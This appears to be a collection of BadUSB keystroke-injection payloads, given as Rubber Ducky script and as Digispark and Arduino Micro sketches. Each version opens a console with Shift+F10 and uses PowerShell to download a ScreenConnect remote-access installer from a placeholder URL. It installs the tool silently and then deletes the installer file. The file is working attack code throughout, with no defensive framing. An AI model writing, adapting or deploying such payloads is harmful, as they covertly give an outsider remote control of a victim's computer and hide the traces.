# Ducky

```
DELAY 1000  
SHIFT F10  
DELAY 1000  
STRING powershell.exe  
DELAY 100  
ENTER  
DELAY 100  
STRING Invoke-WebRequest -Uri {URL} -OutFile C:\Windows\panther\ScreenConnect.ClientSetup.msi  
DELAY 100  
ENTER  
DELAY 15000  
STRING Start-Process msiexec.exe -ArgumentList "/i C:\Windows\panther\ScreenConnect.ClientSetup.msi /quiet /norestart" -Wait  
DELAY 100  
ENTER  
DELAY 15000  
STRING Remove-Item -Path C:\Windows\panther\ScreenConnect.ClientSetup.msi  
DELAY 100  
ENTER  
```

# Digi

Converted using digiQuack by CedArctic ([GitHub link](https://github.com/CedArctic/digiQuack)) 

```cpp
#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT,KEY_F10);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell.exe");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("Invoke-WebRequest -Uri {URL} -OutFile C:\\Windows\\panther\\ScreenConnect.ClientSetup.msi");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(15000);
  DigiKeyboard.print("Start-Process msiexec.exe -ArgumentList \"/i C:\\Windows\\panther\\ScreenConnect.ClientSetup.msi /quiet /norestart\" -Wait");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(15000);
  DigiKeyboard.print("Remove-Item -Path C:\\Windows\\panther\\ScreenConnect.ClientSetup.msi");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
}
```

# Micro

```cpp
/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(1000);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_F10);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("powershell.exe"));

  delay(100);
  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("Invoke-WebRequest -Uri {URL} -OutFile C:\\Windows\\panther\\ScreenConnect.ClientSetup.msi"));

  delay(100);
  typeKey(KEY_RETURN);

  delay(15000);
  Keyboard.print(F("Start-Process msiexec.exe -ArgumentList \"/i C:\\Windows\\panther\\ScreenConnect.ClientSetup.msi /quiet /norestart\" -Wait"));

  delay(100);
  typeKey(KEY_RETURN);

  delay(15000);
  Keyboard.print(F("Remove-Item -Path C:\\Windows\\panther\\ScreenConnect.ClientSetup.msi"));

  delay(100);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
```
